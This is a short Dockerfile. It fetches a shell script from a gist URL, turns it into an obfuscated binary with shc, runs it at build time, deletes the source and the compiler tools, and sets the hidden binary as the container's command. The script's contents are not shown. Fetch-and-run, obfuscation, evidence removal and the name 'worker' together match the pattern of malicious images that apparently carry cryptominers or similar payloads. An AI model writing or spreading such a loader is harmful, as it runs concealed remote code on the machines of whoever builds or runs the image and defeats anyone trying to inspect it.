FROM alpine:edge
ENV SHURL https://gist.githubusercontent.com/vickunwu/32e196f37542b47cf88296205178d5d4/raw/8e648842b44568da0c8994617433249e2a0a2f55/wedog.sh

RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories && apk update && apk add --no-cache gcc musl-dev shc && \
    wget $SHURL -O /worker && shc -r -B -f /worker && /worker.x && \
    apk del gcc musl-dev shc && rm -rf /worker /worker.x.c /var/cache/apk/*

CMD /worker.x
